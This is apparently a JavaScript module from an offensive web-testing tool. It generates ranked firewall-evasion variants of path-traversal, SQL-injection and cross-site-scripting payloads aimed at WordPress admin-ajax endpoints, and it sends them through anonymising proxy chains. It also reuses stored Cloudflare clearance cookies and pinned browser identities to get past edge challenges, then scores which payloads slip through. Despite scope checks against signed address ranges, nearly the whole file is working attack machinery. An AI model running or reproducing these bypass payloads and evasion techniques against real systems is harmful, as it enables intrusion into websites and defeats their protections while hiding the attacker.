// ---------------------------------------------------------------------------
// Mutation matrix
// ---------------------------------------------------------------------------
// A mutation is DATA plus a body/head placement descriptor:
//   { id, family, exotic, rank, note, payload, paramMode, bodyKind, headers, http10 }
// paramMode: single | dup-first | dup-last | array
// bodyKind:  form | multipart   (GET requests use query placement instead)
// `payload` is the WIRE representation: the engine writes it verbatim into the body
// or query -- encoding IS the mutation, so nothing is re-encoded downstream.
//
// NOTE (dispatch constraint): admin-ajax.php action dispatch requires form-encoded
// bodies, so JSON body variants are intentionally NOT generated for these endpoints --
// JSON shapes belong to the generic api classes only.

// Split an LFI base payload into traversal depth + target path.
function splitLfiBase(base) {
  const b = String(base || LFI_BASE);
  const m = /^((?:\.\.\/)+)(.*)$/.exec(b);
  if (m) return { depth: m[1].length / 3, target: m[2] };
  return { depth: 6, target: b.replace(/^\/+/, '') };
}

// Percent-encode every character (full), or dots+slashes only (dots), with an
// optional per-escape case alternation (mixed-case hex escapes).
function pct(str, what, alternateCase) {
  let out = '', flip = false;
  for (const ch of str) {
    const code = ch.codePointAt(0);
    const isDotSlash = ch === '.' || ch === '/';
    const encodeIt = what === 'full' || (what === 'dots' && isDotSlash);
    if (!encodeIt) { out += ch; continue; }
    let hex = code.toString(16).padStart(2, '0');
    if (alternateCase) { hex = flip ? hex.toUpperCase() : hex.toLowerCase(); flip = !flip; }
    out += '%' + hex;
  }
  return out;
}

// Double URL-encode dots+slashes: '.' -> '%252e', '/' -> '%252f'.
function pctDouble(str) {
  let out = '';
  for (const ch of str) {
    if (ch === '.') out += '%252e';
    else if (ch === '/') out += '%252f';
    else out += ch;
  }
  return out;
}

// The LFI matrix: traversal styles x encodings x parameter games x HTTP games.
// rank orders the run (most-likely / control first); exotic flags the long shots.
function lfiMutations(base) {
  const { depth, target } = splitLfiBase(base);
  const t = target;
  const plain = '../'.repeat(depth) + t;
  const muts = [];
  const add = (id, family, payload, opts = {}) =>
    muts.push({ id, family, payload, exotic: !!opts.exotic, note: opts.note || '', paramMode: opts.paramMode || 'single', bodyKind: opts.bodyKind || 'form', headers: opts.headers || null, http10: !!opts.http10 });

  // -- control: the naive public shape (expect the WAF to sign this one) --
  add('lfi-control-plain', 'traversal-style', plain, { note: 'CONTROL: the naive shape every public exploit uses -- establishes that the WAF signs it' });

  // -- traversal styles (filter-collapse and parser-differential shapes) --
  add('lfi-dotdotslash', 'traversal-style', '....//'.repeat(depth) + t, { note: 'strip-once filters collapse ....// to ../ -- the classic Wordfence-era dodge' });
  add('lfi-backslash', 'traversal-style', '..\\/'.repeat(depth) + t, { note: 'mixed separator: Windows/PHP accept ..\\/ as traversal, some signatures only match ../' });
  add('lfi-triple-dot', 'traversal-style', '..././'.repeat(depth) + t, { note: 'strip-once collapse: removing ../ from ..././ yields ../' });
  add('lfi-four-dot', 'traversal-style', '..../'.repeat(depth) + t, { note: 'strip-once collapse: removing ../ from ..../ yields ../' });
  add('lfi-nested', 'traversal-style', '.../'.repeat(depth) + t, { exotic: true, note: 'triple-dot nesting -- exotic parser-differential shape' });
  add('lfi-absolute', 'traversal-style', '/' + t, { note: 'absolute path, no traversal at all -- catches rules that only sign ../ sequences' });
  add('lfi-prefix-satisfying', 'traversal-style', 'templates/' + plain, { note: 'carries an expected prefix (templates/) before the traversal -- satisfies apps that substring-check the prefix' });
  add('lfi-suffix-null', 'traversal-style', plain + '%00', { exotic: true, note: 'null-byte truncation for the case where the server APPENDS .php -- pre-PHP-5.3.4 behavior, exotic today' });

  // -- encodings (applied to the plain style; one double-encoded collapse shape) --
  add('lfi-enc-full', 'encoding', pct(plain, 'full'), { note: 'per-char URL-encode of the whole payload -- WAF decodes once or not at all, PHP always decodes once' });
  add('lfi-enc-dots', 'encoding', pct(plain, 'dots'), { note: 'dots+slashes encoded (%2e%2e%2f), path left literal' });
  add('lfi-enc-double', 'encoding', pctDouble(plain), { note: 'double URL-encode (%252e%252e%252f) -- survives one decode on the WAF side, PHP decode leaves the traversal for a second pass' });
  add('lfi-enc-double-collapse', 'encoding', pctDouble('....//'.repeat(depth) + t), { note: 'double-encoded ....// collapse shape' });
  add('lfi-enc-overlong', 'encoding', plain.split('/').join('%c0%af'), { note: 'overlong UTF-8 slash (%c0%af) -- IIS/legacy decoders accept it as /, strict decoders reject it' });
  add('lfi-enc-mixedcase', 'encoding', pct(plain, 'dots', true), { note: 'mixed-case hex escapes (%2E%2e%2F) -- signatures written lowercase-only miss these' });
  add('lfi-enc-fullwidth', 'encoding', plain.split('.').join('%ef%bc%8e').split('/').join('%ef%bc%8f'), { exotic: true, note: 'fullwidth dot/slash (U+FF0E / U+FF0F, UTF-8 percent-encoded) -- exotic unicode-normalization differential' });

  // -- parameter games (desync between what the WAF inspects and what PHP uses) --
  add('lfi-dup-first-wins', 'param-game', plain, { paramMode: 'dup-first', note: 'duplicate param, payload FIRST + benign second -- wins when the app reads the first occurrence while the WAF inspects the last (or vice versa)' });
  add('lfi-dup-last-wins', 'param-game', plain, { paramMode: 'dup-last', note: 'duplicate param, benign FIRST + payload last -- PHP parse_str keeps the LAST occurrence; WAFs that inspect only the first see the benign value' });
  add('lfi-array', 'param-game', plain, { paramMode: 'array', note: 'array form param[]=payload -- WAF expects a scalar, PHP hands the app an array' });
  add('lfi-multipart', 'param-game', plain, { bodyKind: 'multipart', note: 'multipart/form-data body -- some WAF tiers only inspect urlencoded bodies' });
  add('lfi-charset-explicit', 'param-game', plain, { headers: { 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8' }, note: 'explicit charset -- decoding-differential probe' });
  add('lfi-charset-exotic', 'param-game', plain, { exotic: true, headers: { 'content-type': 'application/x-www-form-urlencoded; charset=utf-16' }, note: 'declared utf-16 charset with an ASCII body (header-only game -- a truly transcoded body is a separate transport, unobserved, not absent)' });

  // -- HTTP games. These target ORIGIN-DIRECT requests: Cloudflare normalizes or strips
  //    override headers aggressively at the edge, so a block here does not prove the
  //    origin signs the shape (unobserved, not absent).
  add('lfi-hdr-x-original-url', 'http-game', plain, { headers: { 'x-original-url': null }, note: 'X-Original-URL path-override header (value = path?param=payload) -- origin-direct technique; Cloudflare strips/normalizes it at the edge' });
  add('lfi-hdr-x-rewrite-url', 'http-game', plain, { headers: { 'x-rewrite-url': null }, note: 'X-Rewrite-URL path-override header -- origin-direct technique; Cloudflare strips/normalizes it at the edge' });
  add('lfi-hdr-method-override', 'http-game', plain, { headers: { 'x-http-method-override': 'GET' }, note: 'method-override header (POST body, declared GET) -- verb-tampering differential' });
  add('lfi-http10', 'http-game', plain, { http10: true, note: 'HTTP/1.0 downgrade -- some WAF tiers only inspect 1.1 keep-alive traffic' });

  return muts.map((m, i) => ({ ...m, rank: i * 10 }));
}

// Generic classes: shallower but real matrices -- the oracle/egress/governance skeleton
// is class-agnostic, so these plug straight in. Payloads are wire-safe (structurally
// percent-encoded) because quotes/spaces would otherwise corrupt the form body.
function sqliMutations(base) {
  const b = String(base || SQLI_BASE);
  const enc = (s) => encodeURIComponent(s);
  const cases = b.replace(/or/ig, (m) => (m === 'or' ? 'oR' : 'Or')).replace(/and/ig, (m) => (m === 'and' ? 'aNd' : 'aND'));
  const commented = b.replace(/ /g, '/**/');
  const tabbed = b.replace(/ /g, '%09');
  const lined = b.replace(/ /g, '%0a');
  const muts = [
    { id: 'sqli-encoded', payload: enc(b), note: 'structural URL-encode (control for this class)' },
    { id: 'sqli-case', payload: enc(cases), note: 'keyword case variation -- case-sensitive signatures miss oR/aNd' },
    { id: 'sqli-comment', payload: enc(commented), note: 'inline comments /**/ replace whitespace' },
    { id: 'sqli-tab', payload: enc(tabbed), note: 'tab (%09) as whitespace' },
    { id: 'sqli-newline', payload: enc(lined), note: 'newline (%0a) as whitespace' },
    { id: 'sqli-double', payload: enc(b).replace(/%/g, '%25'), note: 'double URL-encode' },
    { id: 'sqli-null-prefix', payload: '%00' + enc(b), exotic: true, note: 'leading null byte -- exotic' },
    { id: 'sqli-fullwidth-quote', payload: enc(b).replace(/%27/gi, '%ef%bc%87'), exotic: true, note: 'fullwidth apostrophe (U+FF07) -- exotic normalization differential' },
  ];
  return muts.map((m, i) => ({ family: 'sqli-generic', paramMode: 'single', bodyKind: 'form', headers: null, http10: false, ...m, exotic: !!m.exotic, rank: i * 10 }));
}

function xssMutations(base) {
  const b = String(base || XSS_BASE);
  const enc = (s) => encodeURIComponent(s);
  const cased = b.replace(/script/ig, (m) => m.split('').map((c, i) => (i % 2 ? c.toUpperCase() : c.toLowerCase())).join(''));
  const img = '<img src=x onerror=alert(1)>';
  const muts = [
    { id: 'xss-encoded', payload: enc(b), note: 'structural URL-encode (control for this class)' },
    { id: 'xss-case', payload: enc(cased), note: 'tag case variation' },
    { id: 'xss-alt-vector', payload: enc(img), note: 'alternative vector (img/onerror) -- different signature family' },
    { id: 'xss-double', payload: enc(b).replace(/%/g, '%25'), note: 'double URL-encode' },
    { id: 'xss-null', payload: '%00' + enc(b), exotic: true, note: 'leading null byte -- exotic' },
    { id: 'xss-fullwidth-bracket', payload: enc(b).replace(/%3C/gi, '%ef%bc%9c').replace(/%3E/gi, '%ef%bc%9e'), exotic: true, note: 'fullwidth angle brackets (U+FF1C/U+FF1E) -- exotic' },
  ];
  return muts.map((m, i) => ({ family: 'xss-generic', paramMode: 'single', bodyKind: 'form', headers: null, http10: false, ...m, exotic: !!m.exotic, rank: i * 10 }));
}

const CLASSES = { lfi: lfiMutations, sqli: sqliMutations, xss: xssMutations };

// generateMutations({ klass, base }) -> ranked mutation list (data only; JSON-safe).
export function generateMutations({ klass = 'lfi', base } = {}) {
  const gen = CLASSES[String(klass || '').toLowerCase()];
  if (!gen) return [];
  return gen(base).sort((a, b) => a.rank - b.rank);
}

// ---------------------------------------------------------------------------
// Oracle: PASS only on marker evidence; BLOCKED on status/signature; else OTHER.
// ---------------------------------------------------------------------------
export function classify(res, { markerRe, blockSigs = DEFAULT_BLOCK_SIGS } = {}) {
  const status = Number(res && res.status) || 0;
  const body = String((res && res.body) || '');
  let headText = '';
  try { headText = Object.entries((res && res.headers) || {}).map(([k, v]) => k + ': ' + v).join('\n'); } catch { /* headers unreadable: body-only */ }
  const hay = (body + '\n' + headText).toLowerCase();
  const blockHits = (Array.isArray(blockSigs) ? blockSigs : DEFAULT_BLOCK_SIGS).filter((s) => hay.includes(String(s).toLowerCase()));
  const m = markerRe ? markerRe.exec(body) : null;
  if (m && status > 0 && status < 400) {
    const start = Math.max(0, m.index - 20);
    const snippet = body.slice(start, m.index + m[0].length + 40).replace(/\s+/g, ' ').slice(0, 90);
    return { verdict: 'PASS', snippet, blockHits, status };
  }
  if (status === 403 || status === 406 || blockHits.length) return { verdict: 'BLOCKED', blockHits, status };
  return { verdict: 'OTHER', blockHits, status };
}

// ---------------------------------------------------------------------------
// Governance: signed-scope check + ghost egress gate (fail-closed, never throws)
// ---------------------------------------------------------------------------
async function defaultResolve(host) {
  const r = await dns.promises.lookup(host, { all: true });
  return r.map((x) => x.address);
}

// Every resolved IP must sit inside the signed CIDRs; the refusal prints them.
async function scopeCheck(u, scope, resolve) {
  const cidrs = (Array.isArray(scope) ? scope : String(scope || '').split(',')).map((s) => String(s).trim()).filter(Boolean);
  if (!cidrs.length) {
    return { ok: false, reason: 'no signed engagement scope supplied -- refusing (fail-closed). Re-run with --scope <cidrCsv> from the signed session scope.', scope: [] };
  }
  const host = u.hostname;
  let ips = [];
  const literal = parseIp(host);
  if (literal) {
    ips = [literal.text];
  } else {
    try { ips = await resolve(host); } catch (e) { return { ok: false, reason: 'could not resolve ' + host + ' for scope verification (' + msg(e) + ') -- refusing (fail-closed)', scope: cidrs }; }
    if (!ips.length) return { ok: false, reason: host + ' resolved to no addresses -- scope unverifiable, refusing (fail-closed)', scope: cidrs };
  }
  const outside = ips.filter((ip) => !inAnyCidr(ip, cidrs));
  if (outside.length) {
    return {
      ok: false,
      reason: 'target ' + host + ' resolves outside the signed engagement scope (' + outside.join(', ') + ' not in scope) -- request REFUSED. Signed scope: ' + cidrs.join(','),
      scope: cidrs, resolved: ips, outside,
    };
  }
  return { ok: true, scope: cidrs, resolved: ips };
}

// Public egress requires a configured (and, in required mode, verified) ghost chain.
async function ensureGhost(ghost, u) {
  if (isPrivateDest(u.hostname)) return { ok: true, transport: 'direct (private/range destination -- ghost doctrine: lab traffic never leaves the lab)' };
  if (!ghost || ghost.mode === 'off' || !ghost.chain.length) {
    return { ok: false, reason: 'ghost chain unavailable -- public egress REFUSED (fail-closed). Configure ghost.mode + ghost.chain (e.g. Mullvad socks5://10.64.0.1:1080) and verify the exit first.' };
  }
  if (ghost.mode === 'required' && !ghost.verifiedOk()) {
    try { await ghost.verify(); } catch { /* verify failure is handled below */ }
    if (!ghost.verifiedOk()) {
      return { ok: false, reason: 'ghost mode is required but the chain exit is NOT verified (exit != operator IP unproven) -- public egress REFUSED (fail-closed). Run the ghost self-check first.' };
    }
  }
  return { ok: true, transport: 'ghost chain (' + ghost.chain.length + ' hop(s))' };
}

function ghostFromSettings(engagement) {
  const g = new Ghost();
  try {
    const s = Settings.for(engagement);
    const mode = s.get('ghost.mode');
    if (mode !== 'off') g.configure({ mode, chain: s.get('ghost.chain'), checkUrl: s.get('ghost.checkUrl') });
  } catch { /* an unconfigured ghost stays off: the gate refuses public egress */ }
  return g;
}

// ---------------------------------------------------------------------------
// The vault ride resolution (auto-ride; --no-ride forces cookieless).
// The egressId the lookup rides under is derived from the SAME armed ghost the
// egress gate just vetted: ghost armed with a chain => the chain's canonical id
// (exactly what resolveMintEgress vaults under -- rideEgressId parity), else
// 'direct'. opts.egressId overrides explicitly (the operator seam). A valid,
// unexpired entry then binds the TRANSPORT through broker.resolveRideTransport --
// its fail-closed refusals are inherited as run refusals (riding the wrong egress
// burns the IP-bound cookie; the refusal says how to force cookieless).
// Result: { ok:true, ride: null, gap? } | { ok:true, ride } | { ok:false, reason }.
// Never throws.
// ---------------------------------------------------------------------------
async function resolveVaultRide(u, opts, ghost) {
  try {
    if (opts.ride === false) return { ok: true, ride: null }; // --no-ride: forced cookieless, no vault read
    const ghostMode = opts.ghostMode || (ghost && ghost.mode) || 'off';
    let egressId = 'direct';
    if (opts.egressId) egressId = String(opts.egressId);
    else if (ghostMode !== 'off' && ghost && ghost.chain && ghost.chain.length) {
      try { egressId = chainEgressId(ghost.chain); } catch { egressId = 'direct'; }
    }
    const entry = await clearanceFor(u.href, { egressId, ...(opts.vaultPath ? { vaultPath: opts.vaultPath } : {}) });
    if (!entry) {
      return { ok: true, ride: null, gap: 'no valid clearance for zone ' + u.host + ' -- edge challenge likely; mint first (clearance mint) or provide operator clearance' };
    }
    const t = await resolveRideTransport({ ghost, ghostMode, egressId, hostname: u.hostname });
    if (!t.ok) return { ok: false, reason: t.reason + ' (or pass --no-ride to force a cookieless run)' };
    const cookie = (entry.cookies || []).map((c) => c.name + '=' + c.value).join('; ');
    return {
      ok: true,
      ride: { egressId, transport: t.transport, mintedAt: entry.mintedAt || null, expiresAt: entry.expiresAt || null, ua: entry.ua, cookie, agents: t.agents, direct: !!t.direct },
    };
  } catch (e) { return { ok: false, reason: 'vault ride resolution failed (' + msg(e) + ') -- refusing (fail-closed)' }; }
}

// The report-facing ride view: names the binding WITHOUT the credential material
// (the cookie and UA string ride the wire, never the report -- OPSEC, mirrored in
// lfichain's session-id masking doctrine).
function rideReport(ride) {
  return ride ? { egressId: ride.egressId, transport: ride.transport, mintedAt: ride.mintedAt, expiresAt: ride.expiresAt } : null;
}

// ---------------------------------------------------------------------------
// Default requester: rides the ghost agents (chain for public, direct for private).
// With a vault ride, the requester is bound to the ENTRY's transport instead: a
// chain-keyed entry exits the ghost chain's agents; a sanctioned direct ride
// (direct-bound entry under ghost off|on, or private/range doctrine) must NOT
// silently re-enter the chain -- cf_clearance is IP-bound, so the wire egress is
// the entry's egressId, whichever side of the chain that is. The clearance
// identity survives the scrub: the vault's EXACT UA is pinned as the persona and
// the entry's cookie header rides every request. Resolves { status, headers,
// body } -- network failure is DATA ({ status: 0, error }), never an exception
// (cfmap doctrine).
// ---------------------------------------------------------------------------
function defaultRequester(ghost, { timeoutMs = DEFAULT_TIMEOUT, baseHeaders = {}, ride = null } = {}) {
  return ({ method, url, headers, body }) => new Promise((resolve) => {
    let u;
    try { u = new URL(String(url)); } catch { return resolve({ status: 0, error: 'unparseable request URL' }); }
    const agents = ride ? ride.agents : (ghost ? ghost.agents() : null);
    // Defense in depth: never emit public traffic without a chain, whatever the gate did
    // -- unless the ride gate sanctioned direct egress for this entry's binding.
    if (!isPrivateDest(u.hostname) && !agents && !(ride && ride.direct)) {
      return resolve({ status: 0, error: 'ghost chain unavailable -- public egress refused' });
    }
    const lib = u.protocol === 'https:' ? https : http;
    const hdrs = scrubHeaders({ accept: '*/*', ...baseHeaders, ...(headers || {}), ...(ride && ride.cookie ? { cookie: ride.cookie } : {}) }, ride ? { ua: ride.ua } : undefined);
    if (body != null && !Object.keys(hdrs).some((k) => k === 'content-type')) hdrs['content-type'] = 'application/x-www-form-urlencoded';
    let settled = false;
    const done = (v) => { if (settled) return; settled = true; resolve(v); };
    let req;
    try {
      req = lib.request({
        hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname + u.search, method: method || 'GET', timeout: timeoutMs,
        rejectUnauthorized: false,
        agent: agents ? (u.protocol === 'https:' ? agents.httpsAgent : agents.httpAgent) : undefined,
        headers: hdrs,
      }, (r) => {
        let text = '';
        r.on('data', (d) => { if (text.length < BODY_CAP) text += d.toString('latin1', 0, Math.max(0, BODY_CAP - text.length)); });
        r.on('end', () => done({ status: r.statusCode, headers: r.headers, body: text }));
      });
    } catch (e) { return done({ status: 0, error: msg(e) }); }
    req.on('timeout', () => { try { req.destroy(); } catch {} done({ status: 0, error: 'request timed out (' + timeoutMs + 'ms)' }); });
    req.on('error', (e) => done({ status: 0, error: msg(e) }));
    if (body != null) req.write(body);
    req.end();
  });
}

